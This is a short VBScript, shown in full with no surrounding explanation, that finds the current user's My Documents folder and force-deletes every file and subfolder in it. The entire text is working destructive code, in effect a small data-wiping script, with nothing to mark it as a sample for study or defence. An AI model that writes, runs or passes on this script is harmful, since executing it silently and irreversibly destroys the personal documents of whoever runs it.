Set oShell = CreateObject("WScript.Shell")
sMyDocs = oShell.SpecialFolders("MyDocuments")

Set oFSO = CreateObject("Scripting.FileSystemObject")
oFSO.DeleteFile sMyDocs & "\*.*", True
oFSO.DeleteFolder sMyDocs & "\*.*", True
